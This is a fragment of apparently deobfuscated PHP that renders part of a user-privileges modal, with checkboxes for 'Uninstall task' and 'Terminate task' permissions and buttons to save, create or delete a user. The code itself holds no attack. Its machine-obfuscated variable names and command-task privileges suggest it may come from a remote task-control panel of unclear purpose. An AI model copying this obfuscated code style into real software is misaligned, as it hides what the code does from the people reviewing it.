            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_cmd_uninstall\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Uninstall task</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CMD_TERMINATE) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_cmd_terminate\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Terminate task</label>";
    }
    echo "</td></tr></table></div><div class=\"modal-footer\" align=\"right\">";
    echo "<input type=\"hidden\" name=\"targetu\" value=\"" . $targetuserid . "\">";
    $_obfuscated_0D2F370534180F2A1810163D3431261A09130C3F402832_ = "Save";
    if ($is_new_user_modal == true) {
        $_obfuscated_0D2F370534180F2A1810163D3431261A09130C3F402832_ = "Create user";
    }
    echo "<button type=\"submit\" name=\"save_new\" class=\"btn\" value=\"ok\">" . $_obfuscated_0D2F370534180F2A1810163D3431261A09130C3F402832_ . "</button>";
    if ($my_privs & USER_PRIVILEGES_CREATE_USERS && $is_new_user_modal == false) {
        echo "<button type=\"submit\" name=\"delete_user\" value=\"ok\" class=\"btn\">Delete user</button>";
    }
    echo "<a href=\"#\" class=\"btn\" data-dismiss=\"modal\">Close</a></div></form></div>";
}

?>